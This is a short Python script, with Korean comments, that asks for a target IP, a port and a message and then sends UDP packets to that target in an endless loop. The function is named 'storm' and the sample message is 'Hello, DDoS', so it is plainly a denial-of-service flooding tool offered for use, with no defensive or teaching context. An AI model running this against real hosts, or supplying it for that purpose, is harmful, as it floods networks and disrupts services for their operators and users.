import socket

def storm(sock, message, target_ip, udp_port):
    # send_message
    sock.sendto(message.encode(), (target_ip, udp_port))

target_ip = input('What is the address of the target? : ')  # 예: 127.0.0.1
udp_port = int(input('What port? : '))  # 예: 80, 445
message = input('What message would you like to send? : ')  # 예: Hello, DDoS

print(f"Target IP: {target_ip}, Target Port: {udp_port}, Sending: {message}")


# UDP 소켓 생성
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# 무한 루프를 통해 메시지 전송
while True:
    try:
        storm(sock, message, target_ip, udp_port)
    except KeyboardInterrupt:
        print("\nProcess interrupted by user.")
        break

sock.close()  # 소켓 닫기

